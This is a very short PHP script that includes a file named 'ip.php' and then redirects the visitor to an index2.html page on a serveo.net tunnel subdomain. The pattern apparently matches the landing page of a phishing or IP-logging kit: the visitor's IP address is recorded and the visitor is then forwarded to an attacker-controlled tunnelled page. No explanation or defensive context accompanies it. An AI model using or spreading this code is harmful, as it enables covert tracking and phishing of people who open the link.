<?php
include 'ip.php';
header('Location: https://angguntepos.serveo.net/index2.html');
exit
?>
